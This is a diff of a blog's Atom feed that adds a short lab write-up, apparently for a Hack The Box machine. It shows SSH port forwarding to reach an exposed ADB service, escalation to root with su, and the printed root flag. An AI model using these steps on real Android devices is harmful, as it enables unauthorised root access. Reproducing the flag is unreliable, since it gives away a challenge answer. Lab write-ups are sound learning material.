@@ -4,13 +4,57 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-06-08T18:59:23+08:00</updated>
+ <updated>2022-06-11T18:02:35+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Access ADB as root</title>
+   <link href="https://mvineza.github.io/spindel/2022/06/11/access-adb-as-root"/>
+   <updated>2022-06-11T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/06/11/Access-ADB-as-root</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;Do local port forwarding so you can access abd shell on localhost&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh kristi@htb &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 5555:localhost:5555
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Connect to adb shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb connect localhost:5555
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Verify&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  explore adb devices               
+List of devices attached
+htb:2222	offline
+localhost:5555	device
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Enjoy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb -s localhost shell
+127|x86_64:/ $ whoami
+shell
+x86_64:/ $ su
+:/ # cat data/root.txt
+f04fc82b6d49b41c9b08982be59338c5
+:/ #
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>AI</title>
